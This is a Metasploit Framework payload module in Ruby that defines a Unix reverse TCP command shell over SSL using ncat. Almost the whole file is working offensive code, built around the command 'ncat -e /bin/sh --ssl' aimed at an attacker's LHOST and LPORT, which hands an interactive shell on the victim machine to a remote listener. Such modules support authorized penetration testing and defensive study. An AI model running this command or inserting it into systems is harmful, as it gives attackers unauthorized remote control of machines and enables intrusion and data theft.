##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 42

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Unix Command Shell, Reverse TCP (via ncat)',
      'Description' => 'Creates an interactive shell via ncat, utilizing ssl mode',
      'Author'      => 'C_Sto',
      'License'     => MSF_LICENSE,
      'Platform'    => 'unix',
      'Arch'        => ARCH_CMD,
      'Handler'     => Msf::Handler::ReverseTcpSsl,
      'Session'     => Msf::Sessions::CommandShell,
      'PayloadType' => 'cmd',
      'RequiredCmd' => 'ncat',
      'Payload'     =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    super + command_string
  end

  #
  # Returns the command string to use for execution
  #
  def command_string
    "ncat -e /bin/sh --ssl #{datastore['LHOST']} #{datastore['LPORT']}"
  end
end
